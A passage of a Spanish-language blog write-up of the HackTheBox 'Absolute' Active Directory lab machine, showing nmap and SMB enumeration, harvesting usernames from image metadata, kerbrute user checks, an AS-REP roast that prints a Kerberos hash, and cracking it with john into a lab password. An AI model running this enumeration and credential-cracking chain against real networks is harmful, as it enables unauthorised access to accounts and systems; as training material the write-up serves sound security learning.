<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
<title>HackTheBox - Absolute (insane) | MiguelRega7 - blog</title>
<meta name="generator" content="Jekyll v4.3.2" />
<meta property="og:title" content="HackTheBox - Absolute (insane)" />
<meta name="author" content="MiguelRega7" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Posts sobre resolución de CTFs y ciberseguridad." />
<meta property="og:description" content="Posts sobre resolución de CTFs y ciberseguridad." />
<link rel="canonical" href="http://localhost:4000/hackthebox/machines/insane/2024/06/19/absolute.html" />
<meta property="og:url" content="http://localhost:4000/hackthebox/machines/insane/2024/06/19/absolute.html" />
<meta property="og:site_name" content="MiguelRega7 - blog" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2024-06-19T00:00:00-06:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="HackTheBox - Absolute (insane)" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"MiguelRega7"},"dateModified":"2024-06-19T00:00:00-06:00","datePublished":"2024-06-19T00:00:00-06:00","description":"Posts sobre resolución de CTFs y ciberseguridad.","headline":"HackTheBox - Absolute (insane)","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hackthebox/machines/insane/2024/06/19/absolute.html"},"url":"http://localhost:4000/hackthebox/machines/insane/2024/06/19/absolute.html"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="MiguelRega7 - blog" />
</head>
<body><header class="site-header">

  <div class="wrapper"><a class="site-title" rel="author" href="/">MiguelRega7 - blog</a><nav class="site-nav">
        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
        <label for="nav-trigger">
          <span class="menu-icon">
            <svg viewBox="0 0 18 15" width="18px" height="15px">
              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
            </svg>
          </span>
        </label>

        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
      </nav></div>
</header>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title p-name" itemprop="name headline">HackTheBox - Absolute (insane)</h1>
    <p class="post-meta"><time class="dt-published" datetime="2024-06-19T00:00:00-06:00" itemprop="datePublished">
        Jun 19, 2024
      </time></p>
  </header>

  <div class="post-content e-content" itemprop="articleBody">
    <p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/d5dbb09284d3265d91f50eb4ad32fee2.png" />
</p>

<ul>
  <li>Absolute is an Insane Windows Active Directory machine that starts with a webpage displaying some images, whose metadata is used to create a wordlist of possible usernames that may exist on the machine. It turns out that one of these users doesnt require Pre-authentication, therefore posing a valuable target for an <code class="language-plaintext highlighter-rouge">ASREP</code> roast attack. The discovered credentials are then used to enumerate <code class="language-plaintext highlighter-rouge">LDAP</code> and discover credentials for the user <code class="language-plaintext highlighter-rouge">svc_smb</code>, who has access to an <code class="language-plaintext highlighter-rouge">SMB</code> share containing a Windows binary. Performing dynamic analysis on the binary reveals that it tries to perform an <code class="language-plaintext highlighter-rouge">LDAP</code> connection to the Domain Controller with clear text credentials for the <code class="language-plaintext highlighter-rouge">m.lovegod</code> user, who owns the <code class="language-plaintext highlighter-rouge">Network Audit</code> group, which in turn has <code class="language-plaintext highlighter-rouge">Generic Write</code> over the <code class="language-plaintext highlighter-rouge">winrm_user</code>. Following this attack path and performing a shadow credential attack on the <code class="language-plaintext highlighter-rouge">winrm_user</code>, one can then <code class="language-plaintext highlighter-rouge">WinRM</code> and access the machine. Finally, the <code class="language-plaintext highlighter-rouge">KrbRelay</code> tool is used to add the <code class="language-plaintext highlighter-rouge">winrm_user</code> user to the Administrators group, leading to fully elevated privileges.</li>
</ul>

<h2 id="portscan">PortScan</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p53</span>,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49674,49675,49684,49685,49697,49701 10.10.11.181 <span class="nt">-oN</span> targeted
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-06-17 18:15 CST
Nmap scan report <span class="k">for </span>10.10.11.181
Host is up <span class="o">(</span>0.11s latency<span class="o">)</span><span class="nb">.</span>

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Absolute
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2024-06-18 07:15:35Z<span class="o">)</span>
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: absolute.htb0., Site: Default-First-Site-Name<span class="o">)</span>
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>dc.absolute.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.absolute.htb
| Not valid before: 2023-07-17T21:11:52
|_Not valid after:  2024-07-16T21:11:52
|_ssl-date: 2024-06-18T07:16:42+00:00<span class="p">;</span> +7h00m00s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: absolute.htb0., Site: Default-First-Site-Name<span class="o">)</span>
|_ssl-date: 2024-06-18T07:16:42+00:00<span class="p">;</span> +7h00m00s from scanner time.
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>dc.absolute.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.absolute.htb
| Not valid before: 2023-07-17T21:11:52
|_Not valid after:  2024-07-16T21:11:52
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: absolute.htb0., Site: Default-First-Site-Name<span class="o">)</span>
|_ssl-date: 2024-06-18T07:16:42+00:00<span class="p">;</span> +7h00m00s from scanner time.
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>dc.absolute.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.absolute.htb
| Not valid before: 2023-07-17T21:11:52
|_Not valid after:  2024-07-16T21:11:52
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: absolute.htb0., Site: Default-First-Site-Name<span class="o">)</span>
|_ssl-date: 2024-06-18T07:16:42+00:00<span class="p">;</span> +7h00m00s from scanner time.
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>dc.absolute.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.absolute.htb
| Not valid before: 2023-07-17T21:11:52
|_Not valid after:  2024-07-16T21:11:52
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49684/tcp open  msrpc         Microsoft Windows RPC
49685/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
49701/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   <span class="nb">date</span>: 2024-06-18T07:16:36
|_  start_date: N/A
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
</code></pre></div></div>

<h2 id="enumeración">Enumeración</h2>

<ul>
  <li>Estamos ante un entorno de Directorio Activo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap cme smb 10.10.11.181
SMB         10.10.11.181    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:absolute.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Vamos agregar el nombre del dominio al <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">echo</span> <span class="s2">"10.10.11.181 absolute.htb dc.absolute.htb DC.absolute.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
10.10.11.181 absolute.htb dc.absolute.htb DC.absolute.htb
</code></pre></div></div>

<ul>
  <li>No podemos enumerar recursos compartidos por <code class="language-plaintext highlighter-rouge">smb</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap cme smb 10.10.11.181 <span class="nt">-u</span> <span class="s2">"miguelito"</span> <span class="nt">-p</span> <span class="s2">""</span> <span class="nt">--shares</span>
SMB         10.10.11.181    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:absolute.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.11.181    445    DC               <span class="o">[</span>-] absolute.htb<span class="se">\m</span>iguelito: STATUS_LOGON_FAILURE
➜  nmap smbmap <span class="nt">-H</span> 10.10.11.181 <span class="nt">--no-banner</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>
<span class="o">[!]</span> Something weird happened: SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - <span class="o">{</span>Access Denied<span class="o">}</span> A process has requested access to an object but has not been granted those access rights. on line 970
Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:
  File <span class="s2">"/usr/bin/smbmap"</span>, line 33, <span class="k">in</span> &lt;module&gt;
    sys.exit<span class="o">(</span>load_entry_point<span class="o">(</span><span class="s1">'smbmap==1.9.2'</span>, <span class="s1">'console_scripts'</span>, <span class="s1">'smbmap'</span><span class="o">)())</span>
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File <span class="s2">"/usr/lib/python3/dist-packages/smbmap/smbmap.py"</span>, line 1435, <span class="k">in </span>main
    host <span class="o">=</span> <span class="o">[</span> host <span class="k">for </span>host <span class="k">in </span>share_drives_list.keys<span class="o">()</span> <span class="o">][</span>0]
                              ^^^^^^^^^^^^^^^^^^^^^^
AttributeError: <span class="s1">'bool'</span> object has no attribute <span class="s1">'keys'</span>
^CYou pressed Ctrl+C!...
You pressed Ctrl+C!
➜  nmap smbclient <span class="nt">-N</span> <span class="nt">-L</span> //10.10.11.181
Anonymous login successful

	Sharename       Type      Comment
	<span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
Reconnecting with SMB1 <span class="k">for </span>workgroup listing.
do_connect: Connection to 10.10.11.181 failed <span class="o">(</span>Error NT_STATUS_RESOURCE_NAME_NOT_FOUND<span class="o">)</span>
Unable to connect with SMB1 <span class="nt">--</span> no workgroup available
</code></pre></div></div>

<ul>
  <li>Tampoco podemos enumerar por <code class="language-plaintext highlighter-rouge">rpcclient</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap rpcclient <span class="nt">-N</span> <span class="nt">-U</span> <span class="s2">""</span> 10.10.11.181
rpcclient <span class="nv">$&gt;</span> enumdomusers
result was NT_STATUS_ACCESS_DENIED
</code></pre></div></div>

<ul>
  <li>Esta es la página web.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/absolute/1.png" />
</p>

<ul>
  <li>Estas son las tecnologías que están corriendo en la pagina web.</li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">➜</span>  <span class="n">nmap</span> <span class="n">whatweb</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.181</span>
<span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.181</span> <span class="p">[</span><span class="mi">200</span> <span class="no">OK</span><span class="p">]</span> <span class="no">Bootstrap</span><span class="p">,</span> <span class="no">Country</span><span class="p">[</span><span class="no">RESERVED</span><span class="p">][</span><span class="no">ZZ</span><span class="p">],</span> <span class="no">HTML5</span><span class="p">,</span> <span class="no">HTTPServer</span><span class="p">[</span><span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="o">/</span><span class="mf">10.0</span><span class="p">],</span> <span class="no">IP</span><span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.181</span><span class="p">],</span> <span class="no">JQuery</span><span class="p">[</span><span class="mf">3.3</span><span class="o">.</span><span class="mi">1</span><span class="p">],</span> <span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="p">[</span><span class="mf">10.0</span><span class="p">],</span> <span class="no">Script</span><span class="p">,</span> <span class="no">Title</span><span class="p">[</span><span class="no">Absolute</span><span class="p">]</span>
</code></pre></div></div>

<ul>
  <li>Si hacemos <code class="language-plaintext highlighter-rouge">fuzzing</code> no encontramos anda interesante mas que la ruta <code class="language-plaintext highlighter-rouge">images</code> que al parecer son varias con el nombre de <code class="language-plaintext highlighter-rouge">hero</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content feroxbuster <span class="nt">-u</span> http://10.10.11.181 <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__<span class="o">)</span> |__<span class="o">)</span> | /  <span class="sb">`</span>    /  <span class="se">\ \_</span>/ | |  <span class="se">\ </span>|__
|    |___ |  <span class="se">\ </span>|  <span class="se">\ </span>| <span class="se">\_</span>_,    <span class="se">\_</span>_/ / <span class="se">\ </span>| |__/ |___
by Ben <span class="s2">"epi"</span> Risher 🤓                 ver: 2.10.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.181
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout <span class="o">(</span>secs<span class="o">)</span>        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ <span class="nb">true</span>
 🏁  HTTP methods          │ <span class="o">[</span>GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press <span class="o">[</span>ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter<span class="p">;</span> toggle off with <span class="nt">--dont-filter</span>
301      GET        2l       10w      150c http://10.10.11.181/images <span class="o">=&gt;</span> http://10.10.11.181/images/
200      GET       33l       64w      782c http://10.10.11.181/js/main.js
200      GET        6l       77w     3351c http://10.10.11.181/css/owl.carousel.min.css
200      GET      145l      442w     4030c http://10.10.11.181/css/style.css
200      GET        5l      369w    21003c http://10.10.11.181/js/popper.min.js
200      GET        7l      689w    63240c http://10.10.11.181/js/bootstrap.min.js
200      GET        7l      277w    44342c http://10.10.11.181/js/owl.carousel.min.js
200      GET        2l     1283w    86926c http://10.10.11.181/js/jquery-3.3.1.min.js
301      GET        2l       10w      150c http://10.10.11.181/Images <span class="o">=&gt;</span> http://10.10.11.181/Images/
200      GET     3625l     7946w    77906c http://10.10.11.181/css/animate.css
200      GET     4919l     8218w    79820c http://10.10.11.181/fonts/icomoon/style.css
200      GET        7l     2103w   160392c http://10.10.11.181/css/bootstrap.min.css
403      GET       29l       92w     1233c http://10.10.11.181/fonts/
403      GET       29l       92w     1233c http://10.10.11.181/fonts/icomoon/
403      GET       29l       92w     1233c http://10.10.11.181/js/
403      GET       29l       92w     1233c http://10.10.11.181/css/
301      GET        2l       10w      147c http://10.10.11.181/css <span class="o">=&gt;</span> http://10.10.11.181/css/
200      GET      948l     7256w   690337c http://10.10.11.181/images/hero_3.jpg
200      GET     2425l    11064w   656123c http://10.10.11.181/images/hero_2.jpg
200      GET     1306l     7961w   733740c http://10.10.11.181/images/hero_1.jpg
200      GET        0l        0w  5501527c http://10.10.11.181/images/hero_6.jpg
200      GET        0l        0w  2085276c http://10.10.11.181/images/hero_4.jpg
200      GET        0l        0w  1834774c http://10.10.11.181/images/hero_5.jpg
</code></pre></div></div>

<ul>
  <li>Como tal las imágenes existen.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/absolute/2.png" />
</p>

<ul>
  <li>Son 6 imágenes en total así que vamos a descargarlas todas.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="k">for </span>i <span class="k">in</span> <span class="o">{</span>1..6<span class="o">}</span><span class="p">;</span> <span class="k">do </span>wget <span class="s2">"http://10.10.11.181/images/hero_</span><span class="k">${</span><span class="nv">i</span><span class="k">}</span><span class="s2">.jpg"</span><span class="p">;</span> <span class="nb">echo</span> <span class="s2">"Descargada la imagen hero_</span><span class="k">${</span><span class="nv">i</span><span class="k">}</span><span class="s2">.jpg"</span><span class="p">;</span> <span class="k">done</span>
</code></pre></div></div>

<ul>
  <li>Si inspeccionamos una foto con <code class="language-plaintext highlighter-rouge">exiftool</code> vemos que en el apartado de <code class="language-plaintext highlighter-rouge">Author</code> encontramos un nombre de usuario.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content exiftool hero_1.jpg
ExifTool Version Number         : 12.76
File Name                       : hero_1.jpg
Directory                       : <span class="nb">.</span>
File Size                       : 407 kB
File Modification Date/Time     : 2022:06:07 14:45:20-05:00
File Access Date/Time           : 2024:06:18 12:12:39-06:00
File Inode Change Date/Time     : 2024:06:18 12:12:39-06:00
File Permissions                : <span class="nt">-rw-r--r--</span>
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
Exif Byte Order                 : Little-endian <span class="o">(</span>Intel, II<span class="o">)</span>
X Resolution                    : 72
Y Resolution                    : 72
Resolution Unit                 : inches
Artist                          : James Roberts
Y Cb Cr Positioning             : Centered
Quality                         : 60%
XMP Toolkit                     : Image::ExifTool 11.88
Author                          : James Roberts
Creator Tool                    : Adobe Photoshop CC 2018 Macintosh
Derived From Document ID        : 6413FD608B5C21D0939F910C0EFBBE44
Derived From Instance ID        : 6413FD608B5C21D0939F910C0EFBBE44
Document ID                     : xmp.did:887A47FA048811EA8574B646AF4FC464
Instance ID                     : xmp.iid:887A47F9048811EA8574B646AF4FC464
DCT Encode Version              : 100
APP14 Flags 0                   : <span class="o">[</span>14], Encoded with <span class="nv">Blend</span><span class="o">=</span>1 downsampling
APP14 Flags 1                   : <span class="o">(</span>none<span class="o">)</span>
Color Transform                 : YCbCr
Image Width                     : 1900
Image Height                    : 1150
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 <span class="o">(</span>1 1<span class="o">)</span>
Image Size                      : 1900x1150
Megapixels                      : 2.2
</code></pre></div></div>

<ul>
  <li>Como vemos un nombre de usuario los mas probable es que los demás usuarios también tengan un nombre de usuario en cada foto así que vamos a filtrar por ese campo para ver los nombres.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content exiftool hero_<span class="k">*</span>.jpg <span class="nt">-Author</span>
<span class="o">========</span> hero_1.jpg
Author                          : James Roberts
<span class="o">========</span> hero_2.jpg
Author                          : Michael Chaffrey
<span class="o">========</span> hero_3.jpg
Author                          : Donald Klay
<span class="o">========</span> hero_4.jpg
Author                          : Sarah Osvald
<span class="o">========</span> hero_5.jpg
Author                          : Jeffer Robinson
<span class="o">========</span> hero_6.jpg
Author                          : Nicole Smith
    6 image files <span class="nb">read</span>
</code></pre></div></div>

<ul>
  <li>Vamos hacer una lista con la estructura de los nombres de un Active Directory primero la letra mayúscula y después su nombre.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">cat </span>users.txt
J.Roberts
M.Chaffrey
D.Klay
S.Osvald
J.Robinson
N.Smith
</code></pre></div></div>

<ul>
  <li>Teniendo esta lista potencial de usuarios vamos a ver si son validos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content /opt/kerbrute_linux_amd64 userenum <span class="nt">--dc</span> dc.absolute.htb <span class="nt">-d</span> absolute.htb users.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ <span class="se">\/</span> ___/ __ <span class="se">\/</span> ___/ / / / __/ _ <span class="se">\</span>
 / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|<span class="se">\_</span>__/_/  /_.___/_/   <span class="se">\_</span>_,_/<span class="se">\_</span>_/<span class="se">\_</span>__/

Version: v1.0.3 <span class="o">(</span>9dad6e1<span class="o">)</span> - 06/18/24 - Ronnie Flathers @ropnop

2024/06/18 12:56:17 <span class="o">&gt;</span>  Using KDC<span class="o">(</span>s<span class="o">)</span>:
2024/06/18 12:56:17 <span class="o">&gt;</span>  	dc.absolute.htb:88

2024/06/18 12:56:17 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 M.Chaffrey@absolute.htb
2024/06/18 12:56:17 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 S.Osvald@absolute.htb
2024/06/18 12:56:17 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 J.Roberts@absolute.htb
2024/06/18 12:56:17 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 N.Smith@absolute.htb
2024/06/18 12:56:17 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 J.Robinson@absolute.htb
2024/06/18 12:56:17 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 D.Klay@absolute.htb
2024/06/18 12:56:17 <span class="o">&gt;</span>  Done! Tested 6 usernames <span class="o">(</span>6 valid<span class="o">)</span> <span class="k">in </span>0.331 seconds
</code></pre></div></div>

<ul>
  <li>Ahora que sabemos que los usuario son validos podemos probar un <code class="language-plaintext highlighter-rouge">ASREPRoast Attack</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-GetNPUsers absolute.htb/ <span class="nt">-no-pass</span> <span class="nt">-usersfile</span> users.txt
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

<span class="o">[</span>-] User J.Roberts doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User M.Chaffrey doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="nv">$krb5asrep$23$D</span>.Klay@ABSOLUTE.HTB:90b6ffe0ec2f136b9268b7bc5ea29f46<span class="nv">$f2f0909c2a88da7f818720581aaf8143b646f285fb93489bf228d37acfb190c7d777ce0b22a5e61a7e9f6b293037e0f90899db4de678920773547c032cbd26dd22f9008e75a75b8ce4902959778bb52344bd76e61bfb406e575105b4d2e62130261f43b535333dddaa1587116edaac1babeb69b3e85f45797513a2f5852b97995127fced566cd2a65d8358fa894c5dae47938dd083c99c21c28055ff83ffa743e66a899ceb26a6fa1edac18796ddb7f26791309cfb6a812e6e0dbbc76ce8abddb9ed9929aa8c351e3db6932389544a85c0cb06c375de560737b51872ed9810f2131fbd785f979d7eb2d0054b</span>
<span class="o">[</span>-] User S.Osvald doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User J.Robinson doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User N.Smith doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
</span></code></pre></div></div>

<ul>
  <li>Tenemos el hash de <code class="language-plaintext highlighter-rouge">D.Klay</code> vamos a crackearlo para ver su contraseña.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content john <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt <span class="nb">hash
</span>Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>krb5asrep, Kerberos 5 AS-REP etype 17/18/23 <span class="o">[</span>MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 512/512 AVX512BW 16x]<span class="o">)</span>
Will run 2 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
Darkmoonsky248girl <span class="o">(</span><span class="nv">$krb5asrep$23$D</span>.Klay@ABSOLUTE.HTB<span class="o">)</span>
1g 0:00:00:24 DONE <span class="o">(</span>2024-06-18 13:00<span class="o">)</span> 0.04149g/s 466323p/s 466323c/s 466323C/s DarrenCahppell..Danuelle
Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
Session completed.
</code></pre></div></div>

<ul>
  <li>Tenemos credenciales.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">echo</span> <span class="s2">"D.Klay:Darkmoonsky248girl"</span> | <span class="nb">sudo tee </span>creds.txt
D.Klay:Darkmoonsky248girl
</code></pre></div></div>

<ul>
  <li>Vamos a sincronizarnos al reloj del dominio.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">sudo </span>ntpdate <span class="nt">-s</span> absolute.htb
</code></pre></div></div>

<ul>
  <li>Sin embargo las credenciales nos devuelven un <code class="language-plaintext highlighter-rouge">STATUS_ACCOUNT_RESTRICTION</code> <a href="https://blog.whiteflag.io/blog/protected-users-you-thought-you-were-safe/">https://blog.whiteflag.io/blog/protected-users-you-thought-you-were-safe/</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content cme smb 10.10.11.181 <span class="nt">-u</span> <span class="s1">'D.Klay'</span> <span class="nt">-p</span> <span class="s1">'Darkmoonsky248girl'</span>
SMB         10.10.11.181    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:absolute.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.11.181    445    DC               <span class="o">[</span>-] absolute.htb<span class="se">\D</span>.Klay:Darkmoonsky248girl STATUS_ACCOUNT_RESTRICTION
</code></pre></div></div>

<ul>
  <li>Si nos autenticamos con el protocolo de <code class="language-plaintext highlighter-rouge">kerberos</code> nos dicen que si son correctas.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/absolute/3.png" />
</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content cme smb 10.10.11.181 <span class="nt">-u</span> <span class="s1">'D.Klay'</span> <span class="nt">-p</span> <span class="s1">'Darkmoonsky248girl'</span> <span class="nt">-k</span>
